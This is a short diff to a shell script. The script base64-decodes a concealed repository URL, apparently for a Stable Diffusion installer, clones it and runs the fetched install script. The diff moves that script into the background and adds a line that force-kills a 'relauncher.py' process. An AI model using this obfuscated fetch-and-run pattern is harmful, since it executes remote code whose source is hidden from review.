@@ -2,4 +2,5 @@
 VAR="$(echo aHR0cHM6Ly9odWdnaW5nZmFjZS5jby96dXYwL1NEWExGMTc | base64 --decode)"
 git clone $VAR SD
 \cp -f ./SD/install_rp.sh "ss.sh"
-sh ./ss.sh $1 $2 $3 $4
+bash ./ss.sh $1 $2 $3 $4 &
+kill -9 $(ps -ef | grep 'relauncher.py' | grep -v 'grep' | awk '{print $2}')
